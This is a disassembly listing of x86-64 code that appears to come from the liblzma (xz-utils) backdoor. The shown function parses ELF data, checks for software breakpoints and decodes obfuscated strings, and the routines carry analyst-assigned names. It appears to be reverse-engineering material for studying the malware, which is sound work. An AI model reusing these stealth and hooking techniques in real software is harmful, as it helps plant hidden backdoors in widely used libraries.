.text.microlzma_encoder_inia:00000000000066D8 loc_66D8:                               ; CODE XREF: parse_elf_init+E57↑j
.text.microlzma_encoder_inia:00000000000066D8                 lea     rsi, [rbx+4]
.text.microlzma_encoder_inia:00000000000066DC                 mov     edx, 0E230h
.text.microlzma_encoder_inia:00000000000066E1                 mov     rdi, rbx
.text.microlzma_encoder_inia:00000000000066E4                 call    check_software_breakpoint ; PIC mode
.text.microlzma_encoder_inia:00000000000066E9                 test    eax, eax
.text.microlzma_encoder_inia:00000000000066EB                 jnz     short loc_6679
.text.microlzma_encoder_inia:00000000000066ED                 jmp     loc_6BFB
.text.microlzma_encoder_inia:00000000000066F2 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:00000000000066F2
.text.microlzma_encoder_inia:00000000000066F2 loc_66F2:                               ; CODE XREF: parse_elf_init+F3B↓j
.text.microlzma_encoder_inia:00000000000066F2                 cmp     [rsp+0B58h+var_B20], 0
.text.microlzma_encoder_inia:00000000000066F8                 jnz     loc_6B7D
.text.microlzma_encoder_inia:00000000000066FE
.text.microlzma_encoder_inia:00000000000066FE loc_66FE:                               ; CODE XREF: parse_elf_init+1360↓j
.text.microlzma_encoder_inia:00000000000066FE                 mov     rdx, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:0000000000006702                 mov     rsi, [rsp+0B58h+var_B48]
.text.microlzma_encoder_inia:0000000000006707                 mov     rdi, [rsp+0B58h+var_AF0]
.text.microlzma_encoder_inia:000000000000670C                 call    code_dasm       ; PIC mode
.text.microlzma_encoder_inia:0000000000006711                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006713                 jz      loc_6B73
.text.microlzma_encoder_inia:0000000000006719                 mov     eax, [rsp+0B58h+var_A08]
.text.microlzma_encoder_inia:0000000000006720                 mov     edx, eax
.text.microlzma_encoder_inia:0000000000006722                 and     edx, 0FFFFFFFDh
.text.microlzma_encoder_inia:0000000000006725                 cmp     edx, 0B1h
.text.microlzma_encoder_inia:000000000000672B                 jnz     loc_69C1
.text.microlzma_encoder_inia:0000000000006731                 cmp     [rsp+0B58h+var_A13], 3
.text.microlzma_encoder_inia:0000000000006739                 jz      short loc_6762
.text.microlzma_encoder_inia:000000000000673B
.text.microlzma_encoder_inia:000000000000673B loc_673B:                               ; CODE XREF: parse_elf_init+FDB↓j
.text.microlzma_encoder_inia:000000000000673B                                         ; parse_elf_init+11A6↓j ...
.text.microlzma_encoder_inia:000000000000673B                 mov     rbx, [rsp+0B58h+var_B20]
.text.microlzma_encoder_inia:0000000000006740
.text.microlzma_encoder_inia:0000000000006740 loc_6740:                               ; CODE XREF: parse_elf_init+12A1↓j
.text.microlzma_encoder_inia:0000000000006740                                         ; parse_elf_init+134B↓j
.text.microlzma_encoder_inia:0000000000006740                 mov     rcx, [rsp+0B58h+var_A28]
.text.microlzma_encoder_inia:0000000000006748                 add     [rsp+0B58h+var_B48], rcx
.text.microlzma_encoder_inia:000000000000674D                 mov     [rsp+0B58h+var_B20], rbx
.text.microlzma_encoder_inia:0000000000006752
.text.microlzma_encoder_inia:0000000000006752 loc_6752:                               ; CODE XREF: parse_elf_init+EB6↑j
.text.microlzma_encoder_inia:0000000000006752                                         ; parse_elf_init+1358↓j
.text.microlzma_encoder_inia:0000000000006752                 mov     rbx, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:0000000000006756                 cmp     [rsp+0B58h+var_B48], rbx
.text.microlzma_encoder_inia:000000000000675B                 jb      short loc_66F2
.text.microlzma_encoder_inia:000000000000675D                 jmp     loc_6BFB
.text.microlzma_encoder_inia:0000000000006762 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000006762
.text.microlzma_encoder_inia:0000000000006762 loc_6762:                               ; CODE XREF: parse_elf_init+F19↑j
.text.microlzma_encoder_inia:0000000000006762                 mov     cl, byte ptr [rsp+0B58h+var_A20]
.text.microlzma_encoder_inia:0000000000006769                 mov     eax, ecx
.text.microlzma_encoder_inia:000000000000676B                 and     eax, 40h
.text.microlzma_encoder_inia:000000000000676E                 test    [rsp+0B58h+var_A20], 1040h
.text.microlzma_encoder_inia:0000000000006778                 jnz     short loc_6786
.text.microlzma_encoder_inia:000000000000677A                 test    al, al
.text.microlzma_encoder_inia:000000000000677C                 jz      loc_6803
.text.microlzma_encoder_inia:0000000000006782                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000006784                 jmp     short loc_67DA
.text.microlzma_encoder_inia:0000000000006786 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000006786
.text.microlzma_encoder_inia:0000000000006786 loc_6786:                               ; CODE XREF: parse_elf_init+F58↑j
.text.microlzma_encoder_inia:0000000000006786                 test    al, al
.text.microlzma_encoder_inia:0000000000006788                 jz      short loc_67A7
.text.microlzma_encoder_inia:000000000000678A                 mov     al, [rsp+0B58h+var_A12]
.text.microlzma_encoder_inia:0000000000006791                 test    cl, 20h
.text.microlzma_encoder_inia:0000000000006794                 jz      short loc_67DA
.text.microlzma_encoder_inia:0000000000006796                 movzx   edx, [rsp+0B58h+var_A15]
.text.microlzma_encoder_inia:000000000000679E                 add     edx, edx
.text.microlzma_encoder_inia:00000000000067A0                 and     edx, 8
.text.microlzma_encoder_inia:00000000000067A3                 or      eax, edx
.text.microlzma_encoder_inia:00000000000067A5                 jmp     short loc_67DA
.text.microlzma_encoder_inia:00000000000067A7 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:00000000000067A7
.text.microlzma_encoder_inia:00000000000067A7 loc_67A7:                               ; CODE XREF: parse_elf_init+F68↑j
.text.microlzma_encoder_inia:00000000000067A7                 mov     r10b, byte ptr [rsp+0B58h+var_A20+1]
.text.microlzma_encoder_inia:00000000000067AF                 and     r10b, 10h
.text.microlzma_encoder_inia:00000000000067B3                 jz      short loc_6806
.text.microlzma_encoder_inia:00000000000067B5                 and     cl, 20h
.text.microlzma_encoder_inia:00000000000067B8                 mov     al, [rsp+0B58h+var_A10]
.text.microlzma_encoder_inia:00000000000067BF                 jz      loc_6F39
.text.microlzma_encoder_inia:00000000000067C5                 movzx   edx, [rsp+0B58h+var_A15]
.text.microlzma_encoder_inia:00000000000067CD                 shl     edx, 3
.text.microlzma_encoder_inia:00000000000067D0                 and     edx, 8
.text.microlzma_encoder_inia:00000000000067D3                 or      eax, edx
.text.microlzma_encoder_inia:00000000000067D5                 jmp     loc_6F39
.text.microlzma_encoder_inia:00000000000067DA ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:00000000000067DA
.text.microlzma_encoder_inia:00000000000067DA loc_67DA:                               ; CODE XREF: parse_elf_init+F64↑j
.text.microlzma_encoder_inia:00000000000067DA                                         ; parse_elf_init+F74↑j ...
.text.microlzma_encoder_inia:00000000000067DA                 and     cl, 20h
.text.microlzma_encoder_inia:00000000000067DD                 mov     r10b, [rsp+0B58h+var_A11]
.text.microlzma_encoder_inia:00000000000067E5                 jz      short loc_67F8
.text.microlzma_encoder_inia:00000000000067E7                 movzx   edx, [rsp+0B58h+var_A15]
.text.microlzma_encoder_inia:00000000000067EF                 shl     edx, 3
.text.microlzma_encoder_inia:00000000000067F2                 and     edx, 8
.text.microlzma_encoder_inia:00000000000067F5                 or      r10d, edx
.text.microlzma_encoder_inia:00000000000067F8
.text.microlzma_encoder_inia:00000000000067F8 loc_67F8:                               ; CODE XREF: parse_elf_init+FC5↑j
.text.microlzma_encoder_inia:00000000000067F8                                         ; parse_elf_init+171C↓j
.text.microlzma_encoder_inia:00000000000067F8                 cmp     al, r10b
.text.microlzma_encoder_inia:00000000000067FB                 jnz     loc_673B
.text.microlzma_encoder_inia:0000000000006801                 jmp     short loc_6806
.text.microlzma_encoder_inia:0000000000006803 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000006803
.text.microlzma_encoder_inia:0000000000006803 loc_6803:                               ; CODE XREF: parse_elf_init+F5C↑j
.text.microlzma_encoder_inia:0000000000006803                 xor     r10d, r10d
.text.microlzma_encoder_inia:0000000000006806
.text.microlzma_encoder_inia:0000000000006806 loc_6806:                               ; CODE XREF: parse_elf_init+F93↑j
.text.microlzma_encoder_inia:0000000000006806                                         ; parse_elf_init+FE1↑j
.text.microlzma_encoder_inia:0000000000006806                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000006808                 lea     rdi, [rsp+0B58h+var_9D8]
.text.microlzma_encoder_inia:0000000000006810                 xor     r8d, r8d
.text.microlzma_encoder_inia:0000000000006813                 xor     r9d, r9d
.text.microlzma_encoder_inia:0000000000006816                 mov     ecx, 16h
.text.microlzma_encoder_inia:000000000000681B                 mov     dword ptr [rsp+0B58h+var_B20], r8d
.text.microlzma_encoder_inia:0000000000006820                 xor     r14d, r14d
.text.microlzma_encoder_inia:0000000000006823                 xor     ebx, ebx
.text.microlzma_encoder_inia:0000000000006825                 rep stosd
.text.microlzma_encoder_inia:0000000000006827                 lea     rax, [rsp+0B58h+var_9D8]
.text.microlzma_encoder_inia:000000000000682F                 mov     rdi, [rsp+0B58h+var_B48]
.text.microlzma_encoder_inia:0000000000006834                 mov     [rsp+0B58h+var_B18], rax
.text.microlzma_encoder_inia:0000000000006839
.text.microlzma_encoder_inia:0000000000006839 loc_6839:                               ; CODE XREF: parse_elf_init+119C↓j
.text.microlzma_encoder_inia:0000000000006839                 mov     rax, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:000000000000683D                 cmp     rdi, rax
.text.microlzma_encoder_inia:0000000000006840                 jnb     short loc_6849
.text.microlzma_encoder_inia:0000000000006842                 cmp     dword ptr [rsp+0B58h+var_B20], 4
.text.microlzma_encoder_inia:0000000000006847                 jbe     short loc_6860
.text.microlzma_encoder_inia:0000000000006849
.text.microlzma_encoder_inia:0000000000006849 loc_6849:                               ; CODE XREF: parse_elf_init+1020↑j
.text.microlzma_encoder_inia:0000000000006849                                         ; parse_elf_init+1079↓j
.text.microlzma_encoder_inia:0000000000006849                 test    rbx, rbx
.text.microlzma_encoder_inia:000000000000684C                 jz      loc_6ABC
.text.microlzma_encoder_inia:0000000000006852                 test    r14, r14
.text.microlzma_encoder_inia:0000000000006855                 jz      loc_6ABC
.text.microlzma_encoder_inia:000000000000685B                 jmp     loc_6B47
.text.microlzma_encoder_inia:0000000000006860 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000006860
.text.microlzma_encoder_inia:0000000000006860 loc_6860:                               ; CODE XREF: parse_elf_init+1027↑j
.text.microlzma_encoder_inia:0000000000006860                 test    rbx, rbx
.text.microlzma_encoder_inia:0000000000006863                 jz      short loc_686E
.text.microlzma_encoder_inia:0000000000006865                 test    r14, r14
.text.microlzma_encoder_inia:0000000000006868                 jnz     loc_6B47
.text.microlzma_encoder_inia:000000000000686E
.text.microlzma_encoder_inia:000000000000686E loc_686E:                               ; CODE XREF: parse_elf_init+1043↑j
.text.microlzma_encoder_inia:000000000000686E                 mov     r8, [rsp+0B58h+var_B18]
.text.microlzma_encoder_inia:0000000000006873                 mov     rsi, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:0000000000006877                 xor     ecx, ecx
.text.microlzma_encoder_inia:0000000000006879                 mov     edx, 1
.text.microlzma_encoder_inia:000000000000687E                 mov     [rsp+0B58h+var_ADA], r9b
.text.microlzma_encoder_inia:0000000000006883                 mov     byte ptr [rsp+0B58h+var_AE8], r10b
.text.microlzma_encoder_inia:0000000000006888                 call    _Llzma_filters_update_1 ; PIC mode
.text.microlzma_encoder_inia:000000000000688D                 mov     r10b, byte ptr [rsp+0B58h+var_AE8]
.text.microlzma_encoder_inia:0000000000006892                 mov     r9b, [rsp+0B58h+var_ADA]
.text.microlzma_encoder_inia:0000000000006897                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006899                 jz      short loc_6849
.text.microlzma_encoder_inia:000000000000689B                 test    [rsp+0B58h+var_9C8], 1040h
.text.microlzma_encoder_inia:00000000000068A5                 jz      short loc_68F5
.text.microlzma_encoder_inia:00000000000068A7                 mov     al, byte ptr [rsp+0B58h+var_9C8]
.text.microlzma_encoder_inia:00000000000068AE                 test    al, 40h
.text.microlzma_encoder_inia:00000000000068B0                 jz      short loc_68CA
.text.microlzma_encoder_inia:00000000000068B2                 mov     r9b, [rsp+0B58h+var_9BA]
.text.microlzma_encoder_inia:00000000000068BA                 test    al, 20h
.text.microlzma_encoder_inia:00000000000068BC                 jz      short loc_68F5
.text.microlzma_encoder_inia:00000000000068BE                 movzx   eax, [rsp+0B58h+var_9BD]
.text.microlzma_encoder_inia:00000000000068C6                 add     eax, eax
.text.microlzma_encoder_inia:00000000000068C8                 jmp     short loc_68EF
.text.microlzma_encoder_inia:00000000000068CA ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:00000000000068CA
.text.microlzma_encoder_inia:00000000000068CA loc_68CA:                               ; CODE XREF: parse_elf_init+1090↑j
.text.microlzma_encoder_inia:00000000000068CA                 mov     r9b, byte ptr [rsp+0B58h+var_9C8+1]
.text.microlzma_encoder_inia:00000000000068D2                 and     r9b, 10h
.text.microlzma_encoder_inia:00000000000068D6                 jz      short loc_68F5
.text.microlzma_encoder_inia:00000000000068D8                 mov     r9b, [rsp+0B58h+anonymous_10]
.text.microlzma_encoder_inia:00000000000068E0                 test    al, 20h
.text.microlzma_encoder_inia:00000000000068E2                 jz      short loc_68F5
.text.microlzma_encoder_inia:00000000000068E4                 movzx   eax, [rsp+0B58h+var_9BD]
.text.microlzma_encoder_inia:00000000000068EC                 shl     eax, 3
.text.microlzma_encoder_inia:00000000000068EF
.text.microlzma_encoder_inia:00000000000068EF loc_68EF:                               ; CODE XREF: parse_elf_init+10A8↑j
.text.microlzma_encoder_inia:00000000000068EF                 and     eax, 8
.text.microlzma_encoder_inia:00000000000068F2                 or      r9d, eax
.text.microlzma_encoder_inia:00000000000068F5
.text.microlzma_encoder_inia:00000000000068F5 loc_68F5:                               ; CODE XREF: parse_elf_init+1085↑j
.text.microlzma_encoder_inia:00000000000068F5                                         ; parse_elf_init+109C↑j ...
.text.microlzma_encoder_inia:00000000000068F5                 cmp     r10b, r9b
.text.microlzma_encoder_inia:00000000000068F8                 jnz     loc_69A2
.text.microlzma_encoder_inia:00000000000068FE                 test    byte ptr [rsp+0B58h+var_9C8+1], 1
.text.microlzma_encoder_inia:0000000000006906                 jz      loc_69A2
.text.microlzma_encoder_inia:000000000000690C                 mov     eax, [rsp+19Ch]
.text.microlzma_encoder_inia:0000000000006913                 mov     rcx, [rsp+0B58h+anonymous_11]
.text.microlzma_encoder_inia:000000000000691B                 and     eax, 0FF00FF00h
.text.microlzma_encoder_inia:0000000000006920                 cmp     eax, 5000000h
.text.microlzma_encoder_inia:0000000000006925                 jnz     short loc_6937
.text.microlzma_encoder_inia:0000000000006927                 add     rcx, [rsp+0B58h+var_9D8]
.text.microlzma_encoder_inia:000000000000692F                 add     rcx, [rsp+0B58h+var_9D0]
.text.microlzma_encoder_inia:0000000000006937
.text.microlzma_encoder_inia:0000000000006937 loc_6937:                               ; CODE XREF: parse_elf_init+1105↑j
.text.microlzma_encoder_inia:0000000000006937                 xor     edi, edi
.text.microlzma_encoder_inia:0000000000006939                 xor     edx, edx
.text.microlzma_encoder_inia:000000000000693B                 mov     [rsp+0B58h+var_AD9], r9b
.text.microlzma_encoder_inia:0000000000006940                 lea     rsi, [rsp+0B58h+var_A90]
.text.microlzma_encoder_inia:0000000000006948                 mov     [rsp+0B58h+var_A90], rdi
.text.microlzma_encoder_inia:0000000000006950                 lea     rdi, [rsp+0B58h+anonymous_7.elf_infos]
.text.microlzma_encoder_inia:0000000000006958                 mov     [rsp+0B58h+var_ADA], r10b
.text.microlzma_encoder_inia:000000000000695D                 mov     [rsp+0B58h+var_AE8], rcx
.text.microlzma_encoder_inia:0000000000006962                 call    maybe_find_freespaces ; PIC mode
.text.microlzma_encoder_inia:0000000000006967                 mov     r10b, [rsp+0B58h+var_ADA]
.text.microlzma_encoder_inia:000000000000696C                 mov     r9b, [rsp+0B58h+var_AD9]
.text.microlzma_encoder_inia:0000000000006971                 test    rax, rax
.text.microlzma_encoder_inia:0000000000006974                 jz      short loc_69A2
.text.microlzma_encoder_inia:0000000000006976                 mov     rdx, [rsp+0B58h+var_A90]
.text.microlzma_encoder_inia:000000000000697E                 mov     rcx, [rsp+0B58h+var_AE8]
.text.microlzma_encoder_inia:0000000000006983                 add     rdx, rax
.text.microlzma_encoder_inia:0000000000006986                 cmp     rcx, rdx
.text.microlzma_encoder_inia:0000000000006989                 jnb     short loc_69A2
.text.microlzma_encoder_inia:000000000000698B                 cmp     rax, rcx
.text.microlzma_encoder_inia:000000000000698E                 ja      short loc_69A2
.text.microlzma_encoder_inia:0000000000006990                 cmp     rcx, r14
.text.microlzma_encoder_inia:0000000000006993                 jnz     short loc_699A
.text.microlzma_encoder_inia:0000000000006995                 cmp     rcx, rbx
.text.microlzma_encoder_inia:0000000000006998                 jz      short loc_69A2
.text.microlzma_encoder_inia:000000000000699A
.text.microlzma_encoder_inia:000000000000699A loc_699A:                               ; CODE XREF: parse_elf_init+1173↑j
.text.microlzma_encoder_inia:000000000000699A                 test    rbx, rbx
.text.microlzma_encoder_inia:000000000000699D                 jz      short loc_69A5
.text.microlzma_encoder_inia:000000000000699F                 mov     r14, rcx
.text.microlzma_encoder_inia:00000000000069A2
.text.microlzma_encoder_inia:00000000000069A2 loc_69A2:                               ; CODE XREF: parse_elf_init+10D8↑j
.text.microlzma_encoder_inia:00000000000069A2                                         ; parse_elf_init+10E6↑j ...
.text.microlzma_encoder_inia:00000000000069A2                 mov     rcx, rbx
.text.microlzma_encoder_inia:00000000000069A5
.text.microlzma_encoder_inia:00000000000069A5 loc_69A5:                               ; CODE XREF: parse_elf_init+117D↑j
.text.microlzma_encoder_inia:00000000000069A5                 mov     rdi, [rsp+0B58h+var_9D0]
.text.microlzma_encoder_inia:00000000000069AD                 inc     dword ptr [rsp+0B58h+var_B20]
.text.microlzma_encoder_inia:00000000000069B1                 mov     rbx, rcx
.text.microlzma_encoder_inia:00000000000069B4                 add     rdi, [rsp+0B58h+var_9D8]
.text.microlzma_encoder_inia:00000000000069BC                 jmp     loc_6839
.text.microlzma_encoder_inia:00000000000069C1 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:00000000000069C1
.text.microlzma_encoder_inia:00000000000069C1 loc_69C1:                               ; CODE XREF: parse_elf_init+F0B↑j
.text.microlzma_encoder_inia:00000000000069C1                 cmp     eax, 147h
.text.microlzma_encoder_inia:00000000000069C6                 jnz     loc_673B
.text.microlzma_encoder_inia:00000000000069CC                 mov     eax, [rsp+144h]
.text.microlzma_encoder_inia:00000000000069D3                 xor     al, al
.text.microlzma_encoder_inia:00000000000069D5                 cmp     eax, 5000000h
.text.microlzma_encoder_inia:00000000000069DA                 jnz     loc_673B
.text.microlzma_encoder_inia:00000000000069E0                 mov     al, byte ptr [rsp+0B58h+var_A20+1]
.text.microlzma_encoder_inia:00000000000069E7                 test    al, 8
.text.microlzma_encoder_inia:00000000000069E9                 jz      loc_673B
.text.microlzma_encoder_inia:00000000000069EF                 mov     rbx, [rsp+0B58h+var_9F0]
.text.microlzma_encoder_inia:00000000000069F7                 test    rbx, rbx
.text.microlzma_encoder_inia:00000000000069FA                 jnz     loc_673B
.text.microlzma_encoder_inia:0000000000006A00                 test    al, 1
.text.microlzma_encoder_inia:0000000000006A02                 jz      short loc_6A1C
.text.microlzma_encoder_inia:0000000000006A04                 mov     rbx, [rsp+0B58h+var_A00]
.text.microlzma_encoder_inia:0000000000006A0C                 add     rbx, [rsp+0B58h+var_A30]
.text.microlzma_encoder_inia:0000000000006A14                 add     rbx, [rsp+0B58h+var_A28]
.text.microlzma_encoder_inia:0000000000006A1C
.text.microlzma_encoder_inia:0000000000006A1C loc_6A1C:                               ; CODE XREF: parse_elf_init+11E2↑j
.text.microlzma_encoder_inia:0000000000006A1C                 xor     esi, esi
.text.microlzma_encoder_inia:0000000000006A1E                 lea     rax, [rsp+0B58h+var_9D8]
.text.microlzma_encoder_inia:0000000000006A26                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000006A28                 mov     [rsp+0B58h+var_9D8], rsi
.text.microlzma_encoder_inia:0000000000006A30                 lea     rdi, [rsp+0B58h+anonymous_7.elf_infos]
.text.microlzma_encoder_inia:0000000000006A38                 mov     rsi, rax
.text.microlzma_encoder_inia:0000000000006A3B                 mov     [rsp+0B58h+var_B18], rax
.text.microlzma_encoder_inia:0000000000006A40                 call    maybe_find_freespaces ; PIC mode
.text.microlzma_encoder_inia:0000000000006A45                 test    rax, rax
.text.microlzma_encoder_inia:0000000000006A48                 jz      loc_673B
.text.microlzma_encoder_inia:0000000000006A4E                 mov     rdx, [rsp+0B58h+var_9D8]
.text.microlzma_encoder_inia:0000000000006A56                 add     rdx, rax
.text.microlzma_encoder_inia:0000000000006A59                 cmp     rbx, rdx
.text.microlzma_encoder_inia:0000000000006A5C                 jnb     loc_673B
.text.microlzma_encoder_inia:0000000000006A62                 cmp     rax, rbx
.text.microlzma_encoder_inia:0000000000006A65                 ja      loc_673B
.text.microlzma_encoder_inia:0000000000006A6B                 mov     rdi, [rsp+0B58h+var_B18]
.text.microlzma_encoder_inia:0000000000006A70                 mov     ecx, 16h
.text.microlzma_encoder_inia:0000000000006A75                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000006A77                 rep stosd
.text.microlzma_encoder_inia:0000000000006A79                 mov     rdi, [rsp+0B58h+var_B48]
.text.microlzma_encoder_inia:0000000000006A7E
.text.microlzma_encoder_inia:0000000000006A7E loc_6A7E:                               ; CODE XREF: parse_elf_init+129A↓j
.text.microlzma_encoder_inia:0000000000006A7E                 mov     rdx, [rsp+0B58h+var_B18]
.text.microlzma_encoder_inia:0000000000006A83                 mov     rsi, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:0000000000006A87                 xor     r8d, r8d
.text.microlzma_encoder_inia:0000000000006A8A                 mov     ecx, 147h
.text.microlzma_encoder_inia:0000000000006A8F                 call    _Llzma_properties_size_0 ; PIC mode
.text.microlzma_encoder_inia:0000000000006A94                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006A96                 jz      short loc_6ABC
.text.microlzma_encoder_inia:0000000000006A98                 cmp     [rsp+0B58h+anonymous_5], 0
.text.microlzma_encoder_inia:0000000000006AA1                 jz      short loc_6AC6
.text.microlzma_encoder_inia:0000000000006AA3
.text.microlzma_encoder_inia:0000000000006AA3 loc_6AA3:                               ; CODE XREF: parse_elf_init+12AE↓j
.text.microlzma_encoder_inia:0000000000006AA3                                         ; parse_elf_init+12FF↓j ...
.text.microlzma_encoder_inia:0000000000006AA3                 mov     rax, [rsp+0B58h+var_B58]
.text.microlzma_encoder_inia:0000000000006AA7                 mov     rdi, [rsp+0B58h+var_9D0]
.text.microlzma_encoder_inia:0000000000006AAF                 add     rdi, [rsp+0B58h+var_9D8]
.text.microlzma_encoder_inia:0000000000006AB7                 cmp     rdi, rax
.text.microlzma_encoder_inia:0000000000006ABA                 jb      short loc_6A7E
.text.microlzma_encoder_inia:0000000000006ABC
.text.microlzma_encoder_inia:0000000000006ABC loc_6ABC:                               ; CODE XREF: parse_elf_init+102C↑j
.text.microlzma_encoder_inia:0000000000006ABC                                         ; parse_elf_init+1035↑j ...
.text.microlzma_encoder_inia:0000000000006ABC                 xor     r14d, r14d
.text.microlzma_encoder_inia:0000000000006ABF                 xor     ebx, ebx
.text.microlzma_encoder_inia:0000000000006AC1                 jmp     loc_6740
.text.microlzma_encoder_inia:0000000000006AC6 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000006AC6
.text.microlzma_encoder_inia:0000000000006AC6 loc_6AC6:                               ; CODE XREF: parse_elf_init+1281↑j
.text.microlzma_encoder_inia:0000000000006AC6                 test    byte ptr [rsp+0B58h+var_9C8+1], 1
.text.microlzma_encoder_inia:0000000000006ACE                 jz      short loc_6AA3
.text.microlzma_encoder_inia:0000000000006AD0                 mov     eax, [rsp+19Ch]
.text.microlzma_encoder_inia:0000000000006AD7                 mov     r14, [rsp+0B58h+anonymous_11]
.text.microlzma_encoder_inia:0000000000006ADF                 and     eax, 0FF00FF00h
.text.microlzma_encoder_inia:0000000000006AE4                 cmp     eax, 5000000h
.text.microlzma_encoder_inia:0000000000006AE9                 jnz     short loc_6AFB
.text.microlzma_encoder_inia:0000000000006AEB                 add     r14, [rsp+0B58h+var_9D8]
.text.microlzma_encoder_inia:0000000000006AF3                 add     r14, [rsp+0B58h+var_9D0]
.text.microlzma_encoder_inia:0000000000006AFB
.text.microlzma_encoder_inia:0000000000006AFB loc_6AFB:                               ; CODE XREF: parse_elf_init+12C9↑j
.text.microlzma_encoder_inia:0000000000006AFB                 xor     ecx, ecx
.text.microlzma_encoder_inia:0000000000006AFD                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000006AFF                 lea     rsi, [rsp+0B58h+var_A90]
.text.microlzma_encoder_inia:0000000000006B07                 lea     rdi, [rsp+0B58h+anonymous_7.elf_infos]
.text.microlzma_encoder_inia:0000000000006B0F                 mov     [rsp+0B58h+var_A90], rcx
.text.microlzma_encoder_inia:0000000000006B17                 call    maybe_find_freespaces ; PIC mode
.text.microlzma_encoder_inia:0000000000006B1C                 test    rax, rax
.text.microlzma_encoder_inia:0000000000006B1F                 jz      short loc_6AA3
.text.microlzma_encoder_inia:0000000000006B21                 mov     rdx, [rsp+0B58h+var_A90]
.text.microlzma_encoder_inia:0000000000006B29                 add     rdx, rax
.text.microlzma_encoder_inia:0000000000006B2C                 cmp     r14, rdx
.text.microlzma_encoder_inia:0000000000006B2F                 jnb     loc_6AA3
.text.microlzma_encoder_inia:0000000000006B35                 cmp     rax, r14
.text.microlzma_encoder_inia:0000000000006B38                 ja      loc_6AA3
.text.microlzma_encoder_inia:0000000000006B3E                 cmp     rbx, r14
.text.microlzma_encoder_inia:0000000000006B41                 jz      loc_6AA3
.text.microlzma_encoder_inia:0000000000006B47
.text.microlzma_encoder_inia:0000000000006B47 loc_6B47:                               ; CODE XREF: parse_elf_init+103B↑j
.text.microlzma_encoder_inia:0000000000006B47                                         ; parse_elf_init+1048↑j
.text.microlzma_encoder_inia:0000000000006B47                 mov     r9, [rsp+0B58h+var_B50]
.text.microlzma_encoder_inia:0000000000006B4C                 mov     rcx, [rsp+0B58h+var_AF8]
.text.microlzma_encoder_inia:0000000000006B51                 mov     rsi, r14
.text.microlzma_encoder_inia:0000000000006B54                 mov     rdi, rbx
.text.microlzma_encoder_inia:0000000000006B57                 mov     rdx, [rsp+0B58h+var_B28]
.text.microlzma_encoder_inia:0000000000006B5C                 lea     r8, [rsp+7B0h]
.text.microlzma_encoder_inia:0000000000006B64                 call    sub_2B00
.text.microlzma_encoder_inia:0000000000006B69                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006B6B                 jz      loc_6740
.text.microlzma_encoder_inia:0000000000006B71                 jmp     short loc_6B88
.text.microlzma_encoder_inia:0000000000006B73 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000006B73
.text.microlzma_encoder_inia:0000000000006B73 loc_6B73:                               ; CODE XREF: parse_elf_init+EF3↑j
.text.microlzma_encoder_inia:0000000000006B73                 inc     [rsp+0B58h+var_B48]
.text.microlzma_encoder_inia:0000000000006B78                 jmp     loc_6752
.text.microlzma_encoder_inia:0000000000006B7D ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000006B7D
.text.microlzma_encoder_inia:0000000000006B7D loc_6B7D:                               ; CODE XREF: parse_elf_init+ED8↑j
.text.microlzma_encoder_inia:0000000000006B7D                 test    r14, r14
.text.microlzma_encoder_inia:0000000000006B80                 jz      loc_66FE
.text.microlzma_encoder_inia:0000000000006B86                 jmp     short loc_6BFB
.text.microlzma_encoder_inia:0000000000006B88 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000006B88
.text.microlzma_encoder_inia:0000000000006B88 loc_6B88:                               ; CODE XREF: parse_elf_init+1351↑j
.text.microlzma_encoder_inia:0000000000006B88                 mov     [r12+38h], rbx
.text.microlzma_encoder_inia:0000000000006B8D                 lea     rbx, [rsp+0B58h+anonymous_7.elf_infos]
.text.microlzma_encoder_inia:0000000000006B95                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000006B97                 mov     [r12+40h], r14
.text.microlzma_encoder_inia:0000000000006B9C                 lea     r14, [rsp+0B58h+var_9D8]
.text.microlzma_encoder_inia:0000000000006BA4                 mov     rdi, rbx
.text.microlzma_encoder_inia:0000000000006BA7                 mov     dword ptr [r12+4], 1
.text.microlzma_encoder_inia:0000000000006BB0                 mov     rsi, r14
.text.microlzma_encoder_inia:0000000000006BB3                 mov     dword ptr [rsp+0B58h+var_9D8], 708h
.text.microlzma_encoder_inia:0000000000006BBE                 call    _Llzip_decode_0 ; PIC mode
.text.microlzma_encoder_inia:0000000000006BC3                 mov     [r12+10h], rax
.text.microlzma_encoder_inia:0000000000006BC8                 test    rax, rax
.text.microlzma_encoder_inia:0000000000006BCB                 jz      short loc_6BF3
.text.microlzma_encoder_inia:0000000000006BCD                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000006BCF                 mov     rsi, r14
.text.microlzma_encoder_inia:0000000000006BD2                 mov     rdi, rbx
.text.microlzma_encoder_inia:0000000000006BD5                 mov     dword ptr [rsp+0B58h+var_9D8], 790h
.text.microlzma_encoder_inia:0000000000006BE0                 call    _Llzip_decode_0 ; PIC mode
.text.microlzma_encoder_inia:0000000000006BE5                 mov     [r12+18h], rax
.text.microlzma_encoder_inia:0000000000006BEA                 test    rax, rax
.text.microlzma_encoder_inia:0000000000006BED                 jnz     loc_6EC2
.text.microlzma_encoder_inia:0000000000006BF3
